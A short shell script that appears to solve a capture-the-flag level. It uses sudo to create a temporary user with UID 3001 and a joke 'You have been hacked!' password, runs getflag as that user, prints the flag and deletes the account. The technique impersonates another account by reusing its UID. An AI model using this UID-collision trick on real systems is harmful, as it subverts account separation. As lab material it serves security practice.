#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3001 \
  flag01
echo -n 'flag01: '
sudo -u flag01 getflag | grep -oE '[^ ]+$'
sudo userdel flag01
